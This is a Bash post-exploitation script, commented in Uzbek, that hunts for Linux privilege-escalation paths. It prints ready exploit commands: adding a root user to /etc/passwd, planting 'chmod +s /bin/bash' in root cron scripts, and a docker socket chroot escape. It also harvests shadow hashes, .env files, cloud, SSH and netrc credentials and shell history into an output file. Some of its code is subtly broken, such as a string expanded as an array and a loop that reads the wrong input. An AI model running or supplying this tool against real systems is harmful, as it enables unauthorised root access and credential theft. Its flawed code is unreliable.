#!/bin/bash
# ================================================================
#  Linux Privilege Escalation — Sensitive Data Hunter v2.0
#  Faqat PE uchun muhim bo'lgan narsalarni topadi.
#  Usage: bash pe_hunt.sh
# ================================================================

RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

OUTFILE="./pe_results_$(date +%Y%m%d_%H%M%S).txt"

hit()  { echo -e "${RED}${BOLD}[!!!] $1${NC}";      echo "[!!!] $1" >> "$OUTFILE"; }
warn() { echo -e "${YELLOW}[>>]  $1${NC}";          echo "[>>]  $1" >> "$OUTFILE"; }
sec()  { echo -e "\n${CYAN}${BOLD}━━━ $1 ━━━${NC}"; echo -e "\n=== $1 ===" >> "$OUTFILE"; }
info() { echo -e "      $1";                         echo "      $1" >> "$OUTFILE"; }

banner() {
echo -e "${BOLD}${CYAN}"
cat << 'ART'
  ██████╗ ███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
  ██╔══██╗██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝
  ██████╔╝█████╗      ███████║██║   ██║██╔██╗ ██║   ██║   
  ██╔═══╝ ██╔══╝      ██╔══██║██║   ██║██║╚██╗██║   ██║   
  ██║     ███████╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   
  ╚═╝     ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   
  Linux PE Sensitive Data Hunter v2.0
ART
echo -e "${NC}"
}

# ════════════════════════════════════════════════
# 1. JORIY FOYDALANUVCHI — kim biz?
# ════════════════════════════════════════════════
check_whoami() {
    sec "JORIY FOYDALANUVCHI"
    local user
    user=$(id)
    info "$user"
    echo "$user" | grep -q "uid=0" && hit "Allaqachon ROOT siz!"

    # Guruhlar tekshiruvi — maxsus guruhlar PE imkoniyati beradi
    local groups
    groups=$(id -Gn)
    for g in docker lxd sudo adm disk shadow; do
        echo "$groups" | grep -qw "$g" && hit "Guruhda: $g  →  bu orqali root olish mumkin!"
    done
}

# ════════════════════════════════════════════════
# 2. SUDO HUQUQLARI — eng muhim!
# ════════════════════════════════════════════════
check_sudo() {
    sec "SUDO HUQUQLARI"

    # -n = non-interactive: parol so'ramasdan ishlaydi.
    # Parol kerak bo'lsa sudo darhol chiqib ketadi — biz hech narsa ko'rmaymiz.
    local sudoout
    sudoout=$(sudo -n -l 2>/dev/null)

    if [ -z "$sudoout" ]; then
        # /etc/sudoers ni bevosita o'qishga urinin (root bo'lsak ishlaydi)
        if [ -r /etc/sudoers ]; then
            hit "/etc/sudoers o'qildi! (root huquqi bor)"
            grep -vE "^#|^$|^Defaults" /etc/sudoers 2>/dev/null >> "$OUTFILE"
        else
            info "sudo -n -l: parol kerak yoki huquq yo'q — o'tkazib yuborildi"
        fi
        return
    fi

    echo "$sudoout" >> "$OUTFILE"

    # NOPASSWD — parolsiz sudo = darhol PE
    if echo "$sudoout" | grep -q "NOPASSWD"; then
        hit "NOPASSWD topildi! Parolsiz sudo ishlatish mumkin:"
        echo "$sudoout" | grep "NOPASSWD" | while IFS= read -r line; do
            warn "  $line"
            for bin in vim nano less more find python python3 perl ruby bash sh \
                       awk nmap env tee curl wget cp mv cat dd zip tar git; do
                echo "$line" | grep -qw "$bin" && hit "  GTFOBins: sudo $bin  →  root shell!"
            done
        done
    fi

    # (ALL) — barcha buyruqlar
    echo "$sudoout" | grep -qE "\(ALL\)|\(root\)" && \
        warn "Keng sudo huquqi bor — GTFOBins'da tekshiring"
}

# ════════════════════════════════════════════════
# 3. SUID / SGID BINARIES — root sifatida ishlovchi fayllar
# ════════════════════════════════════════════════
check_suid() {
    sec "SUID / SGID BINARIES"

    # Standart bo'lmagan SUID fayllarni topish
    # (Tizim SUID'larini olib tashlab, noodatiy narsalarga e'tibor)
    local known_suid="/usr/bin/su /usr/bin/sudo /usr/bin/passwd /usr/bin/chsh
                      /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd
                      /usr/bin/mount /usr/bin/umount /usr/bin/pkexec
                      /bin/su /bin/mount /bin/umount /bin/ping"

    while IFS= read -r f; do
        local is_known=0
        for k in $known_suid; do
            [ "$f" = "$k" ] && is_known=1 && break
        done
        if [ "$is_known" -eq 0 ]; then
            hit "NOODATIY SUID: $f"
            warn "  Tekshiring: https://gtfobins.github.io/#+suid"
        else
            info "Standart SUID: $f"
        fi
    done < <(find / -perm -4000 -type f 2>/dev/null | sort)

    # SGID
    sec "SGID BINARIES"
    while IFS= read -r f; do
        warn "SGID: $f"
    done < <(find / -perm -2000 -type f 2>/dev/null \
             | grep -v "^/usr/bin/\|^/usr/sbin/\|^/bin/\|^/sbin/" | sort)
}

# ════════════════════════════════════════════════
# 4. CAPABILITIES — SUID alternativasi
# ════════════════════════════════════════════════
check_capabilities() {
    sec "LINUX CAPABILITIES"

    if ! command -v getcap &>/dev/null; then
        info "getcap topilmadi, o'tkazib yuborildi"
        return
    fi

    while IFS= read -r line; do
        hit "Capability: $line"
        # Xavfli capabilitylar
        echo "$line" | grep -qE "cap_setuid|cap_setgid|cap_net_raw|cap_dac_override|cap_sys_admin" && \
            warn "  BU XAVFLI! GTFOBins'da tekshiring"
    done < <(getcap -r / 2>/dev/null)
}

# ════════════════════════════════════════════════
# 5. YOZISH MUMKIN BO'LGAN MUHIM FAYLLAR
# ════════════════════════════════════════════════
check_writable() {
    sec "ROOT ISHLAYDIGAN YOZISH MUMKIN FAYLLAR"

    # /etc/passwd — agar yozish mumkin bo'lsa, root qo'shish mumkin
    if [ -w /etc/passwd ]; then
        hit "/etc/passwd YOZISH MUMKIN! → yangi root user qo'shish mumkin"
        warn "  Exploit: echo 'hacker::\$(openssl passwd -1 pass):0:0:root:/root:/bin/bash' >> /etc/passwd"
    fi

    # /etc/shadow
    if [ -r /etc/shadow ]; then
        hit "/etc/shadow O'QISH MUMKIN! → parol hashlari:"
        grep -v ":\*:\|:!:" /etc/shadow | grep -v "^#" | tee -a "$OUTFILE"
    fi

    # /etc/sudoers
    if [ -w /etc/sudoers ]; then
        hit "/etc/sudoers YOZISH MUMKIN! → to'liq sudo huquqi berish mumkin"
    fi

    # /etc/cron* ichidagi root cron'lari chaqiradigan fayllar
    sec "CRON SKRIPTLARI — yozish mumkinmi?"
    while IFS= read -r cronfile; do
        # Cron faylida chaqirilgan skript yo'lini top
        grep -oE '/[a-zA-Z0-9_./-]+\.(sh|py|pl|rb)' "$cronfile" 2>/dev/null | while IFS= read -r script; do
            if [ -w "$script" ]; then
                hit "Root cron'i yozish mumkin skriptni chaqiryapti: $script"
                warn "  Exploit: echo 'chmod +s /bin/bash' >> $script"
            fi
        done
    done < <(find /etc/cron* /var/spool/cron -type f 2>/dev/null)

    # PATH'dagi yozish mumkin papkalar
    sec "PATH — yozish mumkin papkalar"
    echo "$PATH" | tr ':' '\n' | while IFS= read -r dir; do
        [ -w "$dir" ] && hit "PATH'da yozish mumkin: $dir  →  PATH hijacking mumkin!"
    done
}

# ════════════════════════════════════════════════
# 6. PAROLLAR — faqat haqiqiy parollar
# ════════════════════════════════════════════════
check_passwords() {
    sec "KONFIGURATSIYA FAYLLARIDAGI PAROLLAR"

    # Faqat muhim joylarda, barcha tizimda emas
    local search_dirs="/etc /opt /var/www /home /srv /app /root"

    while IFS= read -r f; do
        # Sharhlar va binary fayllarni o'tkazib yubor
        match=$(grep -iE "password\s*=|passwd\s*=|db_pass|db_password|secret_key|api_key" \
                "$f" 2>/dev/null | grep -v "^#\|^;\|^//\|example\|sample\|test\|xxx\|changeme\|\*\*\*")
        if [ -n "$match" ]; then
            hit "Parol topildi: $f"
            echo "$match" | head -5 | while IFS= read -r line; do warn "  $line"; done
        fi
    done < <(find "${search_dirs[@]}" -type f \( \
        -name "*.conf" -o -name "*.config" -o -name "*.cnf" \
        -o -name "*.env"  -o -name ".env" \
        -o -name "wp-config.php" -o -name "config.php" \
        -o -name "database.yml" -o -name "settings.py" \
        -o -name "*.ini" -o -name "*.xml" \
    \) 2>/dev/null | grep -v "lib\|share\|doc\|example")

    # Bash tarixi — parol berilgan buyruqlar
    sec "BASH TARIXI — parol o'z ichiga olgan buyruqlar"
    while IFS= read -r hfile; do
        [ -f "$hfile" ] || continue
        match=$(grep -iE \
            "mysql.*-p|psql.*password|sshpass|curl.*-u |wget.*--password|ftp.*pass|ldap.*pass" \
            "$hfile" 2>/dev/null)
        if [ -n "$match" ]; then
            hit "Bash tarixida parol: $hfile"
            echo "$match" | while IFS= read -r line; do warn "  $line"; done
        fi
    done < <(find /home /root -name ".bash_history" -o -name ".zsh_history" 2>/dev/null)

    # Muhit o'zgaruvchilari
    sec "MUHIT O'ZGARUVCHILARI — secretlar"
    env 2>/dev/null | grep -iE \
        "password|passwd|secret|token|api_key|database_url|aws_secret" \
        | grep -v "^#" | while IFS= read -r line; do
        hit "ENV: $line"
    done
}

# ════════════════════════════════════════════════
# 7. SSH KALITLAR
# ════════════════════════════════════════════════
check_ssh() {
    sec "SSH PRIVATE KALITLAR"

    while IFS= read -r keyfile; do
        # Passphrasesiz kalit?
        if ssh-keygen -y -P "" -f "$keyfile" &>/dev/null; then
            hit "PASSPHRASESIZ SSH KALIT: $keyfile  →  darhol foydalanish mumkin!"
        else
            warn "SSH kalit (passphrase bilan): $keyfile"
        fi
        # Bu kalit qaysi hostlarda ishlaydi?
        local pubkey
        pubkey=$(ssh-keygen -y -f "$keyfile" 2>/dev/null)
        if [ -n "$pubkey" ]; then
            grep -rl "$pubkey" /home /root /etc/ssh 2>/dev/null | while IFS= read -r af; do
                warn "  authorized_keys: $af"
            done
        fi
    done < <(find /home /root /etc/ssh /opt -name "id_rsa" -o -name "id_ed25519" \
             -o -name "id_ecdsa" -o -name "id_dsa" 2>/dev/null)
}

# ════════════════════════════════════════════════
# 8. NOODATIY SETUID SKRIPTLAR VA YOZISH MUMKIN /etc
# ════════════════════════════════════════════════
check_misc() {
    sec "QIZIQARLI FAYLLAR VA PAPKALAR"

    # Docker socket — docker guruhisiz ham bo'lsa
    [ -S /var/run/docker.sock ] && hit "Docker socket mavjud! → docker run -v /:/host alpine chroot /host sh"

    # /etc/ld.so.conf.d — library hijacking
    while IFS= read -r f; do
        [ -w "$f" ] && hit "Yozish mumkin ld.so conf: $f  →  library hijacking!"
    done < <(find /etc/ld.so.conf.d -type f 2>/dev/null)

    # Writable /etc papkalar
    find /etc -maxdepth 1 -writable -type f 2>/dev/null | while IFS= read -r f; do
        hit "Yozish mumkin /etc fayli: $f"
    done

    # NFS no_root_squash
    if [ -f /etc/exports ]; then
        grep "no_root_squash" /etc/exports && hit "NFS no_root_squash topildi!"
    fi

    # Zaif fayl ruxsatlari — 777
    sec "777 RUXSATLI MUHIM FAYLLAR"
    find /etc /opt /usr/local /var/www -perm -777 -type f 2>/dev/null | while IFS= read -r f; do
        warn "777: $f"
    done
}

# ════════════════════════════════════════════════
# 9. USER HOME — SENSITIVE MA'LUMOTLAR
# ════════════════════════════════════════════════
check_user_data() {

    # ── 9a. Barcha bash/zsh tarixini to'liq chiqar ──
    sec "SHELL TARIXI — TO'LIQ"
    while IFS= read -r hfile; do
        [ -f "$hfile" ] || continue
        local linecount
        linecount=$(wc -l < "$hfile" 2>/dev/null)
        warn "Tarix fayli: $hfile  ($linecount qator)"
        # Parol, token, URL, buyruq argumentlari
        grep -inE \
            "pass|secret|token|key|api|mysql|psql|mongo|redis|ftp|ssh|curl|wget|http" \
            "$hfile" 2>/dev/null | while IFS= read -r line; do
            hit "  $line"
        done
    done < <(find /home /root -maxdepth 2 \
             \( -name ".bash_history" -o -name ".zsh_history" \
                -o -name ".sh_history" -o -name ".fish_history" \) 2>/dev/null)

    # ── 9b. Shell config fayllar ──
    sec "SHELL CONFIG — .bashrc .zshrc .profile"
    while IFS= read -r rcfile; do
        [ -f "$rcfile" ] || continue
        match=$(grep -inE \
            "export.*pass|export.*secret|export.*token|export.*key|export.*api|alias.*pass" \
            "$rcfile" 2>/dev/null)
        if [ -n "$match" ]; then
            hit "Shell config'da secret: $rcfile"
            echo "$match" | while IFS= read -r line; do warn "  $line"; done
        fi
    done < <(find /home /root -maxdepth 2 \
             \( -name ".bashrc" -o -name ".zshrc" -o -name ".profile" \
                -o -name ".bash_profile" -o -name ".bash_aliases" \) 2>/dev/null)

    # ── 9c. .env fayllar — developer'lar yashirgan narsa ──
    sec ".ENV FAYLLAR"
    while IFS= read -r envfile; do
        warn "Topildi: $envfile"
        grep -vE "^#|^$" "$envfile" 2>/dev/null | while IFS= read -r line; do
            hit "  $line"
        done
    done < <(find /home /root /opt /var/www /srv /app -maxdepth 5 \
             \( -name ".env" -o -name ".env.local" -o -name ".env.production" \
                -o -name ".env.backup" -o -name "*.env" \) 2>/dev/null)

    # ── 9d. Credential manager / netrc / ftp ──
    sec "SAQLANGAN PAROLLAR — netrc, credentials, authinfo"
    while IFS= read -r cf; do
        [ -f "$cf" ] || continue
        hit "Credential fayl: $cf"
        while IFS= read -r line; do warn "  $line"; done
    done < <(find /home /root -maxdepth 3 \
             \( -name ".netrc" -o -name ".ftprc" -o -name ".pgpass" \
                -o -name ".my.cnf" -o -name ".mycnf" \
                -o -name "credentials" -o -name ".credentials" \
                -o -name ".authinfo" -o -name "*.netrc" \) 2>/dev/null)

    # ── 9e. Cloud credentials (AWS, GCP, Azure) ──
    sec "CLOUD CREDENTIALS"
    local cloud_files=(
        "$HOME/.aws/credentials"
        "$HOME/.aws/config"
        "$HOME/.config/gcloud/credentials.db"
        "$HOME/.config/gcloud/application_default_credentials.json"
        "$HOME/.azure/accessTokens.json"
        "$HOME/.azure/azureProfile.json"
    )
    for cf in "${cloud_files[@]}"; do
        if [ -f "$cf" ]; then
            hit "Cloud credential fayl: $cf"
            grep -vE "^#|^$|\[" "$cf" 2>/dev/null | head -20 | \
                while IFS= read -r line; do warn "  $line"; done
        fi
    done
    # Boshqa userlarda ham tekshir
    while IFS= read -r cf; do
        hit "Cloud credential (boshqa user): $cf"
        head -10 "$cf" 2>/dev/null | while IFS= read -r line; do warn "  $line"; done
    done < <(find /home -path "*/.aws/credentials" \
             -o -path "*/.azure/accessTokens.json" 2>/dev/null | grep -v "^$HOME")

    # ── 9f. Brauzer saqlangan parollar ──
    sec "BRAUZER CREDENTIAL FAYLLAR"
    while IFS= read -r bf; do
        hit "Brauzer fayli: $bf"
    done < <(find /home /root -maxdepth 6 \
             \( -name "logins.json" -o -name "key4.db" -o -name "cert9.db" \
                -o -name "Login Data" -o -name "Cookies" \
                -o -name "Web Data" \) 2>/dev/null)

    # ── 9g. SSH config — qaysi hostlarga ulanishlar ──
    sec "SSH CONFIG — saqlangan hostlar va userlar"
    while IFS= read -r sc; do
        [ -f "$sc" ] || continue
        warn "SSH config: $sc"
        grep -iE "hostname|user|identityfile|password" "$sc" 2>/dev/null | \
            while IFS= read -r line; do info "  $line"; done
    done < <(find /home /root -maxdepth 3 -name "config" -path "*/.ssh/*" 2>/dev/null)

    # known_hosts — qaysi serverlarga ulangan
    while IFS= read -r kh; do
        local count
        count=$(wc -l < "$kh" 2>/dev/null)
        warn "known_hosts ($count host): $kh"
    done < <(find /home /root -maxdepth 3 -name "known_hosts" 2>/dev/null)

    # ── 9h. Dastur config papkalari ──
    sec "DASTUR CONFIG PAPKALARI — ~/.config ichida secretlar"
    while IFS= read -r f; do
        match=$(grep -iE "password|passwd|secret|token|api_key|access_key" \
                "$f" 2>/dev/null | grep -v "^#\|example\|sample")
        if [ -n "$match" ]; then
            hit "Config'da secret: $f"
            echo "$match" | head -3 | while IFS= read -r line; do warn "  $line"; done
        fi
    done < <(find /home /root -maxdepth 5 -path "*/.config/*" -type f \
             \( -name "*.json" -o -name "*.yaml" -o -name "*.yml" \
                -o -name "*.toml" -o -name "*.ini" -o -name "*.conf" \) 2>/dev/null)

    # ── 9i. Matn fayllar — eslatmalar, parol ro'yxatlari ──
    sec "MATN FAYLLAR — parol yozib qo'yilgan bo'lishi mumkin"
    while IFS= read -r f; do
        match=$(grep -iE "password|passwd|pass:|pin:|secret|credential" \
                "$f" 2>/dev/null | grep -v "^#")
        if [ -n "$match" ]; then
            hit "Matn faylda parol: $f"
            echo "$match" | head -5 | while IFS= read -r line; do warn "  $line"; done
        fi
    done < <(find /home /root /Desktop -maxdepth 4 \
             \( -name "*.txt" -o -name "*.md" -o -name "notes*" \
                -o -name "passwords*" -o -name "creds*" -o -name "pass*" \) \
             -type f 2>/dev/null)

    # ── 9j. Skriptlar ichida hardcoded parollar ──
    sec "SKRIPTLAR — hardcoded parollar"
    while IFS= read -r f; do
        match=$(grep -inE \
            "(password|passwd|secret|token|api_key)\s*[=:]\s*['\"][^'\"]{4,}" \
            "$f" 2>/dev/null | grep -v "^#\|example\|changeme\|your_")
        if [ -n "$match" ]; then
            hit "Hardcoded credential: $f"
            echo "$match" | head -5 | while IFS= read -r line; do warn "  $line"; done
        fi
    done < <(find /home /root /opt /var/www -maxdepth 6 \
             \( -name "*.py" -o -name "*.sh" -o -name "*.php" \
                -o -name "*.js"  -o -name "*.rb"  -o -name "*.pl" \
                -o -name "*.go"  -o -name "*.java" \) \
             -type f 2>/dev/null | grep -v ".pyc\|node_modules\|vendor\|dist")

    # ── 9k. Database fayllar ──
    sec "DATABASE FAYLLAR"
    while IFS= read -r dbf; do
        warn "DB fayl: $dbf  ($(du -sh "$dbf" 2>/dev/null | cut -f1))"
    done < <(find /home /root /opt /var/www -maxdepth 6 \
             \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \
                -o -name "*.sql" \) -type f 2>/dev/null | grep -v "test\|sample")
}

# ════════════════════════════════════════════════
# YAKUNIY XULOSA
# ════════════════════════════════════════════════
summary() {
    local hits
    hits=$(grep -c "^\[!!!\]" "$OUTFILE" 2>/dev/null || echo 0)
    local warns
    warns=$(grep -c "^\[>>\]" "$OUTFILE" 2>/dev/null || echo 0)

    echo -e "\n${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}${BOLD}  [!!!] Kritik topilmalar : $hits ta${NC}"
    echo -e "${YELLOW}  [>>]  Tekshirish kerak   : $warns ta${NC}"
    echo -e "${CYAN}  Barcha natijalar: ${BOLD}$OUTFILE${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

# ════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════
banner
echo "Skan boshlandi: $(date)" > "$OUTFILE"

check_whoami
check_sudo
check_suid
check_capabilities
check_writable
check_passwords
check_ssh
check_misc
check_user_data
summary
